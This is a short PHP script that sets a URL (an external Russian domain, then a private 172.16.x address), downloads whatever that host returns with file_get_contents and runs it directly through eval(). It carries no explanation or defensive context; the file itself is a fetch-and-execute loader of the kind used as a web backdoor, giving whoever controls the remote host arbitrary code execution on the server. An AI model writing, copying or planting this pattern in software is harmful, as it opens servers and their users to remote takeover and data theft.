<?php 
// Русский текст...
$url = "http://www.pokolenia-permkray.ru/test/1";
$url = "http://172.16.56.140/test/1";
$s = file_get_contents( $url );

//$s = "echo '111';";
//echo $s;
eval($s);
?>
